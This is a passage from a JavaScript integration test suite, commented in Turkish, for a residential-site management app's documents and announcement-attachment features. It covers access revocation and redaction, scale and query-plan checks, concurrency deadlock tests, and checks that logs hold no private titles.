  const confirmedDelete = await call('DELETE', vBase(`/${attDocA}`), MGR, { confirm: true });
  const afterDelete = await call('GET', `/app/announcements/${annId}`, R2.user);
  check('K8: onayla silinince ek available:false olur; indirme 404', confirmedDelete.status === 200 && afterDelete.body.attachments[0].available === false && (await call('GET', attUrl, R2.user)).status === 404);
  // R16 P2-2: YONETICI duyuru ayrinti UCU kullanilamayan ekin bilgisini KORUR (sakin ayni veride null); gercek HTTP
  const managerDetailGone = await call('GET', `${aBase}/${annId}`, MGR);
  const residentDetailGone = await call('GET', `/app/announcements/${annId}`, R2.user);
  check('K8b (R16 P2-2): belge silinince (available:false) YONETICI ayrinti ucunda baslik / dosya adi / tur / boyut KORUNUR; SAKIN ayrintisinda ayni ek null (A12)',
    managerDetailGone.status === 200 && managerDetailGone.body.attachments[0].available === false && managerDetailGone.body.attachments[0].title === 'Ek Belgesi A' && managerDetailGone.body.attachments[0].file_name === 'ek-a.pdf' && managerDetailGone.body.attachments[0].mime_type === 'application/pdf' && managerDetailGone.body.attachments[0].size_bytes === PDF.length &&
      residentDetailGone.body.attachments[0].available === false && residentDetailGone.body.attachments[0].title === null && residentDetailGone.body.attachments[0].file_name === null,
    { manager: managerDetailGone.body?.attachments, resident: residentDetailGone.body?.attachments });
  await call('POST', vBase(`/${attDocA}/restore`), MGR);
  check('K9: belge geri alinca ek yeniden available:true ve indirilebilir', (await call('GET', attUrl, R2.user)).status === 200);
  await q(`UPDATE site_modules SET enabled = FALSE WHERE site_code = $1 AND module_code = 'documents'`, [vis.code]);
  const closedDetail = await call('GET', `/app/announcements/${annId}`, R2.user);
  check('K10: modul kapaliyken ek available:false, indirme 404; duyurunun kendisi etkilenmez', closedDetail.status === 200 && closedDetail.body.attachments[0].available === false && (await call('GET', attUrl, R2.user)).status === 404);
  await q(`UPDATE site_modules SET enabled = TRUE WHERE site_code = $1 AND module_code = 'documents'`, [vis.code]);
  await call('POST', `${aBase}/${annId}/withdraw`, MGR);
  check('K11: geri cekilen duyurunun eki indirilemez (404)', (await call('GET', attUrl, R2.user)).status === 404);
  await call('DELETE', vBase(`/${attDocA}`), MGR, { confirm: true });
  await q(`UPDATE documents SET deleted_at = NOW() - INTERVAL '31 days' WHERE id = $1`, [attDocA]);
  await runDocumentsMaintenanceOnce();
  check('K12: belge kalici silinince ek bagi dusar (CASCADE); duyuru kalir', (await countOf(`SELECT COUNT(*)::int AS n FROM announcement_attachments WHERE document_id = $1`, [attDocA])) === 0 && (await call('GET', `${aBase}/${annId}`, MGR)).status === 200);
  const draftOnly = await call('POST', aBase, MGR, annBody({ document_ids: [attDocB] }));
  await call('PATCH', vBase(`/${attDocB}`), MGR, { audience: 'board' });
  check('K13: kitlesi residents disina cekilen belge TASLAK duyurudan otomatik cikarilir (audit detached auto)', (await call('GET', `${aBase}/${draftOnly.body.id}`, MGR)).body.attachment_count === 0 && (await countOf(`SELECT COUNT(*)::int AS n FROM audit_log WHERE action = 'document.detached' AND target_id = $1 AND (details->>'auto')::boolean`, [String(attDocB)])) === 1);

  // R9 F1 + F7: duyuru eki yolu belgenin KITLESINI (residents) de ister; kitle daralinca eski ve YENI surum sizmaz, ad / dosya adi / tur / boyut null doner
  await expirePending();
  const f1Bytes = markerPdf('F1-SURUM-1-AAAA');
  const f1Doc = await vdoc({ audience: 'residents', title: 'F1 Gizli Olacak Baslik', file: { name: 'f1-gizli-v1.pdf', size: f1Bytes.length } }, f1Bytes);
  const f1Draft = await call('POST', aBase, MGR, annBody({ title: 'F1 duyurusu', document_ids: [f1Doc] }));
  const f1Pub = await call('POST', `${aBase}/${f1Draft.body.id}/publish`, MGR);
  const f1Url = `/app/announcements/${f1Draft.body.id}/attachments/${f1Doc}/download`;
  const f1Before = await call('GET', f1Url, R2.user);
  const f1Unconfirmed = await call('PATCH', vBase(`/${f1Doc}`), MGR, { audience: 'board' });
  const f1Change = await call('PATCH', vBase(`/${f1Doc}`), MGR, { audience: 'board', confirm: true });
  const f1AfterChange = await call('GET', f1Url, R2.user);
  const f1v2Bytes = markerPdf('F1-SURUM-2-BBBB');
  const f1v2Created = await call('POST', vBase(`/${f1Doc}/versions`), MGR, { file: { name: 'f1-gizli-v2.pdf', size: f1v2Bytes.length } });
  const f1v2Put = await rawPut(f1v2Created.body.upload.path, MGR, f1v2Bytes);
  const f1AfterV2 = await call('GET', f1Url, R2.user);
  const f1Detail = await call('GET', `/app/announcements/${f1Draft.body.id}`, R2.user);
  const f1Inbox = (await call('GET', '/app/announcements', R2.user)).body.items.find((item) => item.id === f1Draft.body.id);
  const f1Redacted = { document_id: f1Doc, title: null, file_name: null, mime_type: null, size_bytes: null, available: false };
  check('K14 (R9 F1): yayindaki duyuruya ekli belgenin kitlesi residents disina cekilince (onayla) ek ANINDA 404; ONAYSIZ degisiklik 409 DOCUMENT_IN_USE; YENI surum yuklense de sizmaz (404)',
    f1Pub.status === 200 && f1Before.status === 200 && f1Unconfirmed.status === 409 && f1Unconfirmed.body.code === 'DOCUMENT_IN_USE' && f1Change.status === 200 && f1AfterChange.status === 404 && f1v2Put.status === 200 && f1AfterV2.status === 404,
    { before: f1Before.status, unconfirmed: f1Unconfirmed.body?.code, change: f1Change.status, after: f1AfterChange.status, v2: f1v2Put.status, afterV2: f1AfterV2.status });
  check('K15 (R9 F1 + F7): sakin gorunumunde (ayrinti + gelen kutusu) kitlesi daralan ek available:false ve baslik / dosya adi / tur / boyut NULL (silinmis ya da daralmis belgenin adi ve yeni surumun dosya adi sizmaz)',
    f1Detail.status === 200 && same(f1Detail.body.attachments, [f1Redacted]) && same(f1Inbox?.attachments, [f1Redacted]) && !JSON.stringify([f1Detail.body, f1Inbox]).includes('Gizli') && !JSON.stringify([f1Detail.body, f1Inbox]).includes('gizli'),
    { detail: f1Detail.body.attachments, inbox: f1Inbox?.attachments });
  const f1ManagerView = (await loadAttachments(pool, [f1Draft.body.id], { forManager: true })).get(f1Draft.body.id);
  check('K15b: yonetici gorunumu (forManager) ad bilgisini KORUR: baslik + guncel (v2) dosya adi + available:false; ayrinti ucu bunu sakin icin varsayilan olarak maskeler', f1ManagerView?.[0]?.title === 'F1 Gizli Olacak Baslik' && f1ManagerView[0].file_name === 'f1-gizli-v2.pdf' && f1ManagerView[0].available === false, f1ManagerView);
  const f1Back = await call('PATCH', vBase(`/${f1Doc}`), MGR, { audience: 'residents' });
  const f1Restored = await call('GET', f1Url, R2.user);
  const f1DetailBack = await call('GET', `/app/announcements/${f1Draft.body.id}`, R2.user);
  check('K16: kitle residents\'a geri alininca ek yeniden indirilebilir (GUNCEL surum) ve available:true, ad bilgisi geri gelir', f1Back.status === 200 && f1Restored.status === 200 && Buffer.compare(f1Restored.raw, f1v2Bytes) === 0 && f1DetailBack.body.attachments[0].available === true && f1DetailBack.body.attachments[0].title === 'F1 Gizli Olacak Baslik', f1DetailBack.body.attachments);

  // --- R16 P2-5: tasinan / pasiflestirilen sakin eski duyurunun eki uzerinden belgenin YENI surumunu indiremez
  await expirePending();
  const mvDoc = await vdoc({ audience: 'residents', title: 'Tasinan Denemesi' }, markerPdf('TASINAN-S1-AAAAA'));
  const mover = await resident(vis, B1, 'Tasinan Sakin');
  const mvDraft = await call('POST', aBase, MGR, annBody({ title: 'Tasinan duyurusu', document_ids: [mvDoc] }));
  await call('POST', `${aBase}/${mvDraft.body.id}/publish`, MGR);
  const mvUrl = `/app/announcements/${mvDraft.body.id}/attachments/${mvDoc}/download`;
  const mvBefore = await call('GET', mvUrl, mover.user);
  // ayni sitede BASKA daireye gecis: ilişki korunur
  await q(`UPDATE apartment_residencies SET is_current = FALSE, move_out_date = CURRENT_DATE WHERE person_id = $1 AND is_current`, [mover.person]);
  await addResidency(vis.code, A2.id, mover.person);
  const mvSameSite = await call('GET', mvUrl, mover.user);
  // siteden TASINMA: iliski biter; sonradan yuklenen yeni surum eski duyurunun ekiyle indirilemez
  await q(`UPDATE apartment_residencies SET is_current = FALSE, move_out_date = CURRENT_DATE WHERE person_id = $1 AND is_current`, [mover.person]);
  const mvNewBytes = markerPdf('TASINAN-S2-BBBBB');
  const mvNew = await call('POST', vBase(`/${mvDoc}/versions`), MGR, { file: { name: 'yeni.pdf', size: mvNewBytes.length } });
  await rawPut(mvNew.body.upload.path, MGR, mvNewBytes);
  const mvDirect = await call('GET', `/app/documents/${mvDoc}/download`, mover.user);
  const mvViaAnn = await call('GET', mvUrl, mover.user);
  const mvDetail = await call('GET', `/app/announcements/${mvDraft.body.id}`, mover.user);
  const mvInbox = (await call('GET', '/app/announcements', mover.user)).body.items.find((item) => item.id === mvDraft.body.id);
  const mvRedacted = { document_id: mvDoc, title: null, file_name: null, mime_type: null, size_bytes: null, available: false };
  check('K17 (R16 P2-5): ayni sitede baska daireye gecen sakin eki indirmeye devam eder; siteden TASINAN sakin eski duyurunun eki uzerinden belgeyi (yeni surum dahil) INDIREMEZ (404, dogrudan indirme ile ayni), ek available:false ve ad / dosya adi null',
    mvBefore.status === 200 && mvSameSite.status === 200 && mvDirect.status === 404 && mvViaAnn.status === 404 && !mvViaAnn.raw.includes(Buffer.from('TASINAN-S2')) && same(mvDetail.body.attachments, [mvRedacted]) && same(mvInbox?.attachments, [mvRedacted]),
    { before: mvBefore.status, sameSite: mvSameSite.status, direct: mvDirect.status, viaAnn: mvViaAnn.status, detail: mvDetail.body?.attachments });
  // geri tasinma: iliski yeniden kurulunca CANLI olarak erisim geri gelir; kisi PASIFLESTIRILINCE yine kaybolur
  await addResidency(vis.code, B1.id, mover.person);
  const mvBack = await call('GET', mvUrl, mover.user);
  await q(`UPDATE site_people SET is_active = FALSE WHERE id = $1`, [mover.person]);
  const mvInactive = await call('GET', mvUrl, mover.user);
  const mvInactiveDetail = await call('GET', `/app/announcements/${mvDraft.body.id}`, mover.user);
  check('K17b (R16 P2-5): iliski yeniden kurulunca erisim ANINDA geri gelir (200, GUNCEL surum); kisi pasiflestirilince yine 404 (canli degerlendirme)',
    mvBack.status === 200 && Buffer.compare(mvBack.raw, mvNewBytes) === 0 && mvInactive.status === 404 && (mvInactiveDetail.status !== 200 || mvInactiveDetail.body.attachments.every((entry) => entry.available === false)), { back: mvBack.status, inactive: mvInactive.status });

  // ============================================================================================================
  // L. Olcek: 3000 daireli site, 2000 belge
  // ============================================================================================================
  console.log('--- L. olcek ---');
  const big = await mkSite('Buyuk Site', { 'Tek Blok': 3 });
  const bigBlock = big.apts[0].blockId;
  await q(`INSERT INTO apartments (site_code, block_id, unit_label, sort_order) SELECT $1, $2, 'Toplu ' || g, 10 + g FROM generate_series(1, 3000) g`, [big.code, bigBlock]);
  const bigUser = await mkUser('Buyuk Sakin', 'apartment_owner');
  const bigPerson = await addPerson(big.code, bigUser);
  const bigApt = Number((await q(`SELECT id FROM apartments WHERE site_code = $1 AND unit_label = 'Toplu 1500'`, [big.code])).rows[0].id);
  await addResidency(big.code, bigApt, bigPerson);
  await linkManager(big.code, MGR);
  await enableModule(big.code);
  // diger sitelerde de belge (planlayici gercekci dagilim gorsun)
  await q(
    `INSERT INTO documents (site_code, category, title, audience, target_type, status, current_version_no, version_count, next_version_no, created_by, created_at, updated_at)
     SELECT $1, 'other', 'Toplu ' || g, CASE WHEN g % 4 = 0 THEN 'managers' ELSE 'residents' END, 'site', 'active', 1, 1, 2, $2, NOW(), NOW() FROM generate_series(1, 2000) g`,
    [big.code, MGR],
  );
  await q(
    `INSERT INTO document_versions (document_id, site_code, version_no, status, storage_key, display_name, mime_type, declared_size_bytes, size_bytes, sha256, completed_at, uploaded_by)
     SELECT d.id, d.site_code, 1, 'ready', d.site_code || '/' || gen_random_uuid()::text, 'toplu.pdf', 'application/pdf', 1000, 1000, repeat('a', 64), NOW(), $2 FROM documents d WHERE d.site_code = $1 AND d.title LIKE 'Toplu %'`,
    [big.code, MGR],
  );
  await q(
    `INSERT INTO documents (site_code, category, title, audience, target_type, status, current_version_no, version_count, next_version_no)
     SELECT 1000000000 + (g % 200) + 1000, 'other', 'Gurultu ' || g, 'residents', 'site', 'active', 1, 1, 2 FROM generate_series(1, 20000) g
     WHERE EXISTS (SELECT 1 FROM sites WHERE site_code = 1000000000 + (g % 200) + 1000)`,
  );
  await q('ANALYZE documents');
  await q('ANALYZE document_versions');
  await q('ANALYZE site_people');
  const t0 = Date.now();
  const bigList = await call('GET', '/app/documents?limit=30', bigUser);
  const bigMs = Date.now() - t0;
  const t1 = Date.now();
  const bigMgr = await call('GET', `/manager/sites/${big.code}/documents?limit=50`, MGR);
  const bigMgrMs = Date.now() - t1;
  check(`L1: 3000 daireli sitede 2000 belge: sakin listesi ${bigMs} ms (30 kayit), yonetici listesi ${bigMgrMs} ms; sonuclar dogru (yalniz residents; ${bigList.body.items.length} kayit)`, bigList.status === 200 && bigList.body.items.length === 30 && bigList.body.next_before_id !== null && bigMs < 1500 && bigMgr.status === 200 && bigMgr.body.total === 2000 && bigMgrMs < 1500, { bigMs, bigMgrMs });
  hooks.log = [];
  await call('GET', '/app/documents?limit=30', bigUser);
  const listQuery = hooks.log.find((entry) => /FROM documents d/.test(entry.text ?? '') && /ORDER BY d\.id DESC/.test(entry.text ?? '') && /LIMIT/.test(entry.text ?? ''));
  hooks.log = null;
  const plan = JSON.stringify((await q(`EXPLAIN (FORMAT JSON) ${listQuery.text}`, listQuery.values)).rows[0]['QUERY PLAN']);
  check('L2: sakin listesi planinda `documents` uzerinde SIRALI TARAMA (Seq Scan) YOK; belge erisimi indeksle (idx_documents_site_status / site_category / pkey)', !/"Node Type":"Seq Scan","Parallel Aware":(true|false),"Async Capable":(true|false),"Relation Name":"documents"/.test(plan) && /idx_documents_site|documents_pkey|idx_documents_site_category/.test(plan), plan.slice(0, 400));
  const usageStart = Date.now();
  const usageBig = await call('GET', `/manager/sites/${big.code}/documents?limit=1`, MGR);
  check(`L3: kota / sayi hesabi (SUM, COUNT) 2000 belgede hizli (${Date.now() - usageStart} ms) ve dogru (used_bytes 2.000.000)`, usageBig.body.usage.used_bytes === 2_000_000 && usageBig.body.usage.document_count === 2000);

  // ============================================================================================================
  // M. Kilit sirasi turlari (40P01 = 0) ve gizlilik
  // ============================================================================================================
  console.log('--- M. kilit sirasi ve gizlilik ---');
  const lockSite = await mkSite('Kilit Sitesi', { 'A Blok': 2 });
  await linkManager(lockSite.code, MGR);
  await enableModule(lockSite.code);
  const lockRes = await resident(lockSite, lockSite.apts[0], 'Kilit Sakini');
  const lBase = `/manager/sites/${lockSite.code}`;
  hooks.deadlocks = 0;
  const lockStatuses = [];
  const lockOps = [];
  const lockDocs = [];
  for (let i = 0; i < 5; i += 1) lockDocs.push((await publish(MGR, { audience: 'residents', title: `Kilit ${i}` }, makePdf({ padding: i * 11 }), lockSite.code)).id);
  const annLock = await call('POST', `${lBase}/announcements`, MGR, annBody({ document_ids: [lockDocs[0]] }));
  for (let round = 0; round < 10; round += 1) {
    const d = lockDocs[round % lockDocs.length];
    lockOps.push(
      call('PATCH', `${lBase}/documents/${d}`, MGR, { title: `Kilit yeni ${round}` }).then((r) => lockStatuses.push(r.status)),
      call('POST', `${lBase}/documents/${d}/versions`, MGR, { file: { name: 'v.pdf', size: PDF.length } }).then(async (r) => { lockStatuses.push(r.status); if (r.status === 201) lockStatuses.push((await rawPut(r.body.upload.path, MGR, PDF)).status); }),
      call('GET', '/app/documents', lockRes.user).then((r) => lockStatuses.push(r.status)),
      call('GET', `/app/documents/${d}/download`, lockRes.user).then((r) => lockStatuses.push(r.status)),
      call('PATCH', `${lBase}/announcements/${annLock.body.id}`, MGR, { document_ids: [lockDocs[round % 3]] }).then((r) => lockStatuses.push(r.status)),
      call('DELETE', `${lBase}/documents/${lockDocs[(round + 1) % lockDocs.length]}`, MGR, { confirm: true }).then((r) => lockStatuses.push(r.status)),
      call('POST', `${lBase}/documents/${lockDocs[(round + 1) % lockDocs.length]}/restore`, MGR).then((r) => lockStatuses.push(r.status)),
      q(`UPDATE users SET full_name = full_name WHERE user_code = $1`, [lockRes.user]),
      q(`UPDATE sites SET name = name WHERE site_code = $1`, [lockSite.code]),
    );
  }
  await Promise.all(lockOps);
  await call('POST', `${lBase}/announcements/${annLock.body.id}/publish`, MGR);
  check(`M1: karisik 10 tur x 9 eszamanli islem (belge yazma / surum / sakin okuma / indirme / duyuru eki / silme-geri alma / kullanici-site guncelleme): 40P01 = ${hooks.deadlocks}, 5xx yok`, hooks.deadlocks === 0 && lockStatuses.every((s) => s < 500), { deadlocks: hooks.deadlocks, statuses: [...new Set(lockStatuses)] });

  const auditAll = (await q(`SELECT action, details::text AS d FROM audit_log WHERE action LIKE 'document.%'`)).rows;
  check('M2: audit_log belge kayitlarinda baslik / dosya adi / not / aciklama YOK (yalniz kimlik, sayi, alan adi)', !auditAll.some((r) => /GIZLI|Siteyle|Yaris|yonetmelik/i.test(r.d)) && auditAll.length > 20, auditAll.length);
  const allLogs = [...serverErrors, ...logLines].join('\n');
  check('M3: sunucu gunlugunde (error + log + warn) baslik, dosya adi, not YOK; indirme satirlari yalniz kimlik / numara', !allLogs.includes(SECRET_TITLE) && !allLogs.includes(SECRET_FILE) && !allLogs.includes(SECRET_NOTE) && !/qa\.example/.test(allLogs) && logLines.filter((l) => /\[documents\] download/.test(l)).every((l) => /^\[documents\] download doc=\d+ v=\d+ user=\d+$/.test(l)), allLogs.split('\n').filter((l) => /GIZLI|qa\.example/.test(l)).slice(0, 3));
  const dlLines = logLines.filter((l) => /\[documents\] download/.test(l)).length;
  check(`M4: OLCUM (bilgi): kosu boyunca ${dlLines} indirme satiri, ${serverErrors.length} sunucu hata satiri`, true);

  console.log = realLog;
  console.warn = realWarn;
  server.closeAllConnections?.();
  await new Promise((resolve) => server.close(resolve));
  await fsp.rm(storageRoot, { recursive: true, force: true });
  await finishChild(pool);
}
